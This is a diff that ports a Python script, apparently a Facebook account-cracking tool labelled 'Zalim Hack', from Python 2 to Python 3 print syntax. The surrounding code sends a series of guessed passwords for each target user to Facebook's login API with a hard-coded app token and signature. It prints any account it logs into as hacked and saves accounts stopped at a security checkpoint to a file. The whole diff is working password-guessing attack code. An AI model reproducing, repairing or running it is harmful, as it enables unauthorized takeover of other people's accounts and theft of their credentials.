@@ -481,7 +481,7 @@ def choice_action():
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q1["error_msg"]:
-					print "[Zalim Cp] " + user + " | " + pass1
+					print ("[Zalim Cp] " + user + " | " + pass1)
 					cps = open("checkpoint.txt", "a")
 					cps.write(user+"|"+pass1+"\n")
 					cps.close()
@@ -490,11 +490,11 @@ def choice_action():
 					data2 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q2 = json.loads(data2.text)
 					if "access_token" in q2:
-						print "\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2
+						print ("\x1b[1;92m[Zalim Hack]\x1b[0m " + user + " | " + pass2)
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q2["error_msg"]:
-							print "[Zalim Cp] " + user + " | " + pass2
+							print ("[Zalim Cp] " + user + " | " + pass2)
 							cps = open("checkpoint.txt", "a")
 							cps.write(user+"|"+pass2+"\n")
 							cps.close()
@@ -503,7 +503,7 @@ def choice_action():
 							data3 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q3 = json.loads(data3.text)
 							if "access_token" in q3:
-								print "\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3
+								print ("\x1b[1;95m[Zalim Hack]\x1b[0m " + user + " | " + pass3)
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q3["error_msg"]:
@@ -516,11 +516,11 @@ def choice_action():
 									data4 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q4 = json.loads(data4.text)
 									if "access_token" in q4:
-										print "\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4
+										print ("\x1b[1;94m[Zalim Hack]\x1b[0m " + user + " | " + pass4)
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q4["error_msg"]:
-											print "[Zalim Cp] " + user + " | " + pass4
+											print ("[Zalim Cp] " + user + " | " + pass4)
 											cps = open("checkpoint.txt", "a")
 											cps.write(user+"|"+pass4+"\n")
 											cps.close()
@@ -529,11 +529,11 @@ def choice_action():
 											data5 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q5 = json.loads(data5.text)
 											if "access_token" in q5:
-												print "\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5
+												print ("\x1b[1;93m[Zalim Hack]\x1b[0m " + user + " | " + pass5)
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q5["error_msg"]:
-													print "[Zalim Cp] " + user + " | " + pass5
+													print ("[Zalim Cp] " + user + " | " + pass5)
 													cps = open("checkpoint.txt", "a")
 													cps.write(user+"|"+pass5+"\n")
 													cps.close()
@@ -542,11 +542,11 @@ def choice_action():
 													data6 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q6 = json.loads(data6.text)
 													if "access_token" in q6:
-														print "\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6
+														print ("\x1b[1;97m[Zalim Hack]\x1b[0m " + user + " | " + pass6)
 														oks.append(user+pass6)
 													else:
 														if "www.facebook.com" in q6["error_msg"]:
-															print "[CZalim Cp] " + user + " | " + pass6
+															print ("[CZalim Cp] " + user + " | " + pass6)
 															cps = open("checkpoint.txt", "a")
 															cps.write(user+"|"+pass6+"\n")
 															cps.close()
@@ -555,11 +555,11 @@ def choice_action():
 															data7 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q7 = json.loads(data7.text)
 															if "access_token" in q7:
-																print "\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7
+																print ("\x1b[1;98m[Zalim Hack]\x1b[0m " + user + " | " + pass7)
 																oks.append(user+pass7)
 															else:
 																if "www.facebook.com" in q7["error_msg"]:
-																	print "[Zalim Cp] " + user + " | " + pass7
+																	print ("[Zalim Cp] " + user + " | " + pass7)
 																	cps = open("checkpoint.txt", "a")
 																	cps.write(user+"|"+pass7+"\n")
 																	cps.close()
